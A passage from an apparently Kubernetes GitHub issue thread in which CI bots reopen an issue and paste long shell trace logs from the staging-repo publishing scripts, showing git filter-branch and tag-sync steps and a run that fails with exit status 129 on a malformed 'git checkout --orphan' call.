LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-sample-cli-plugin-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-sample-cli-plugin-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-sample-cli-plugin-master.sh --dependencies api:master,apimachinery:master,cli-runtime:master,client-go:master -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse master\n>\t+ '[' f4e363a823fe8eaa807df3be1cacda3d2ffe7f66 '!=' f4e363a823fe8eaa807df3be1cacda3d2ffe7f66 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is ahead of 'origin/master' by 8 commits.\n>\t  (use \"git push\" to publish your local commits)\n>[07 Sep 18 22:03 UTC]: Successfully constructed master\n>[07 Sep 18 22:03 UTC]: /publish_scripts/construct.sh sample-cli-plugin master release-1.12 api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/sample-cli-plugin kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\" \n>\t+ '[' '!' 13 -eq 13 ']'\n>\t+ REPO=sample-cli-plugin\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/sample-cli-plugin\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\t+ echo 'Cleaning up checkout.'\n>\tCleaning up checkout.\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>\t+ git branch -D release-1.12\n>\terror: branch 'release-1.12' not found.\n>\t+ true\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\t+ echo 'Branch origin/release-1.12 not found. Creating orphan release-1.12 branch.'\n>\t+ git checkout -q --orphan release-1.12\n>\tBranch origin/release-1.12 not found. Creating orphan release-1.12 branch.\n>\t+ git rm -q --ignore-unmatch -rf .\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/sample-cli-plugin master release-1.12 /go-workspace/src/k8s.io/kubernetes/.git api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0 '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>\t+ local src_branch=master\n>\t+ local dst_branch=release-1.12\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=false\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t+ echo 'Found repo without release-1.12 branch, creating initial commit.'\n>\t+ git commit -m 'Initial commit' --allow-empty\n>\tFound repo without release-1.12 branch, creating initial commit.\n>\t[release-1.12 (root-commit) 92e71a2] Initial commit\n>\t+ new_branch=true\n>\t+ orphan=true\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\t+ echo 'Checked out source commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\tChecked out source commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' true = true ']'\n>\t+ '[' master = master ']'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/sample-cli-plugin 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' master filtered-branch\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\tRunning git filter-branch ...\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/sample-cli-plugin -- master filtered-branch\n>\tWARNING: Ref 'refs/heads/master' is unchanged\n>\t++ git log --first-parent --format=%H --reverse HEAD\n>\t+ f_mainline_commits='a5c85c50ed122db63d07f09051466c8935e06c0d\n>\t76038115e20a3ceb76809d27634b1df77d86e263\n>\t277165466ca9820d8c328999bdd153fac72a2a11\n>\t6486a043eb38c7909c0f07d5ce4f808dcb408964\n>\t6d2426b8acccf110fe3fd0ca4efe115610cfec7d'\n>\t+ '[' true = true ']'\n>\t+ git checkout -q release-1.12 --orphan\n>\terror: option `orphan' requires a value\n>\tusage: git checkout [options] <branch>\n>\t   or: git checkout [options] [<branch>] -- <file>...\n>\n>\t    -q, --quiet           suppress progress reporting\n>\t    -b <branch>           create and checkout a new branch\n>\t    -B <branch>           create/reset and checkout a branch\n>\t    -l                    create reflog for new branch\n>\t    --detach              detach the HEAD at named commit\n>\t    -t, --track           set upstream info for new branch\n>\t    --orphan <new-branch>\n>\t                          new unparented branch\n>\t    -2, --ours            checkout our version for unmerged files\n>\t    -3, --theirs          checkout their version for unmerged files\n>\t    -f, --force           force checkout (throw away local modifications)\n>\t    -m, --merge           perform a 3-way merge with the new branch\n>\t    --overwrite-ignore    update ignored files (default)\n>\t    --conflict <style>    conflict style (merge or diff3)\n>\t    -p, --patch           select hunks interactively\n>\t    --ignore-skip-worktree-bits\n>\t                          do not limit pathspecs to sparse entries only\n>\n>[07 Sep 18 22:03 UTC]: exit status 129\n>    \t+ '[' '!' 13 -eq 13 ']'\n>    \t+ REPO=sample-cli-plugin\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=release-1.12\n>    \t+ DEPS=api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/sample-cli-plugin\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>    \t+ git branch -D release-1.12\n>    \terror: branch 'release-1.12' not found.\n>    \t+ true\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.12\n>    \t+ echo 'Branch origin/release-1.12 not found. Creating orphan release-1.12 branch.'\n>    \t+ git checkout -q --orphan release-1.12\n>    \t+ git rm -q --ignore-unmatch -rf .\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/sample-cli-plugin master release-1.12 /go-workspace/src/k8s.io/kubernetes/.git api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0 '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=release-1.12\n>    \t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ local deps=api:release-1.12,apimachinery:release-1.12,cli-runtime:release-1.12,client-go:release-9.0\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ shift 9\n>    \t+ local is_library=false\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t+ echo 'Found repo without release-1.12 branch, creating initial commit.'\n>    \t+ git commit -m 'Initial commit' --allow-empty\n>    \t+ new_branch=true\n>    \t+ orphan=true\n>    \t+ git remote rm upstream\n>    \t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' true = true ']'\n>    \t+ '[' master = master ']'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/sample-cli-plugin 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' master filtered-branch\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/sample-cli-plugin -- master filtered-branch\n>    \tWARNING: Ref 'refs/heads/master' is unchanged\n>    \t++ git log --first-parent --format=%H --reverse HEAD\n>    \t+ f_mainline_commits='a5c85c50ed122db63d07f09051466c8935e06c0d\n>    \t76038115e20a3ceb76809d27634b1df77d86e263\n>    \t277165466ca9820d8c328999bdd153fac72a2a11\n>    \t6486a043eb38c7909c0f07d5ce4f808dcb408964\n>    \t6d2426b8acccf110fe3fd0ca4efe115610cfec7d'\n>    \t+ '[' true = true ']'\n>    \t+ git checkout -q release-1.12 --orphan\n>    \terror: option `orphan' requires a value\n>    \tusage: git checkout [options] <branch>\n>    \t   or: git checkout [options] [<branch>] -- <file>...\n>\n>    \t    -q, --quiet           suppress progress reporting\n>    \t    -b <branch>           create and checkout a new branch\n>    \t    -B <branch>           create/reset and checkout a branch\n>    \t    -l                    create reflog for new branch\n>    \t    --detach              detach the HEAD at named commit\n>    \t    -t, --track           set upstream info for new branch\n>    \t    --orphan <new-branch>\n>    \t                          new unparented branch\n>    \t    -2, --ours            checkout our version for unmerged files\n>    \t    -3, --theirs          checkout their version for unmerged files\n>    \t    -f, --force           force checkout (throw away local modifications)\n>    \t    -m, --merge           perform a 3-way merge with the new branch\n>    \t    --overwrite-ignore    update ignored files (default)\n>    \t    --conflict <style>    conflict style (merge or diff3)\n>    \t    -p, --patch           select hunks interactively\n>    \t    --ignore-skip-worktree-bits\n>    \t                          do not limit pathspecs to sparse entries only\n>\n>\n>[07 Sep 18 22:03 UTC]: exit status 129```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-419703930):\n\n>/reopen\n>\n>The last publishing run failed: no upstream branch \"master\" found\n>```\n>...g.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code ff4146fb766380fffdcabd0b6edc2be82fa4bc00\n>\tRemove redundant godep commits on-top of ff4146fb766380fffdcabd0b6edc2be82fa4bc00.\n>\t+ echo 'Remove redundant godep commits on-top of ff4146fb766380fffdcabd0b6edc2be82fa4bc00.'\n>\t+ git reset --soft -q ff4146fb766380fffdcabd0b6edc2be82fa4bc00\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-proxy\n>\t+ local repo=kube-proxy\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-proxy-release-1.12\n>\t+ '[' -n 'ff4146f Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-proxy-release-1.12'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=ff4146fb766380fffdcabd0b6edc2be82fa4bc00\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-proxy-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-proxy-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-proxy-release-1.12.sh --dependencies apimachinery:release-1.12 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse release-1.12\n>\t+ '[' ff4146fb766380fffdcabd0b6edc2be82fa4bc00 '!=' ff4146fb766380fffdcabd0b6edc2be82fa4bc00 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Sep 18 09:53 UTC]: Successfully constructed release-1.12\n>[09 Sep 18 09:53 UTC]: Successfully ensured /go-workspace/src/k8s.io/kubelet exists\n>[09 Sep 18 09:53 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Sep 18 09:53 UTC]: /publish_scripts/construct.sh kubelet master master apimachinery:master,api:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kubelet kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kubelet\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kubelet\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 6616588648145f6b060184f5e516c0a665eaafe5\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' f26556cc14e2a01a1904805566e082484c1f33f9 '!=' f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\t+ echo 'Skipping sync because upstream/master at f26556cc14e2a01a1904805566e082484c1f33f9 did not change since last sync.'\n>\tSkipping sync because upstream/master at f26556cc14e2a01a1904805566e082484c1f33f9 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=cf37f0b201335035dc1dddaca3925617a9942162\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kubelet-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kubelet-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kubelet-master.sh --dependencies apimachinery:master,api:master -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse master\n>\t+ '[' cf37f0b201335035dc1dddaca3925617a9942162 '!=' cf37f0b201335035dc1dddaca3925617a9942162 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[09 Sep 18 09:54 UTC]: Successfully constructed master\n>[09 Sep 18 09:54 UTC]: /publish_scripts/construct.sh kubelet release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kubelet kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kubelet\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kubelet\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q cf37f0b201335035dc1dddaca3925617a9942162\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote rm upstream\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 '!=' f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''f26556cc14e2a01a1904805566e082484c1f33f9'\\'' to '\\''30b0b2d36c9719ec02a6a0414db2ddc802b040e7'\\''. We have to sync.'\n>\tUpstream branch upstream/release-1.12 moved from 'f26556cc14e2a01a1904805566e082484c1f33f9' to '30b0b2d36c9719ec02a6a0414db2ddc802b040e7'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/kubelet release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/kubelet\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t6616588648145f6b060184f5e516c0a665eaafe5\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 8 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit 6616588648145f6b060184f5e516c0a665eaafe5.\n>\t+ echo 'Starting at existing release-1.12 commit 6616588648145f6b060184f5e516c0a665eaafe5.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ echo 'Checked out source commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.12\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: 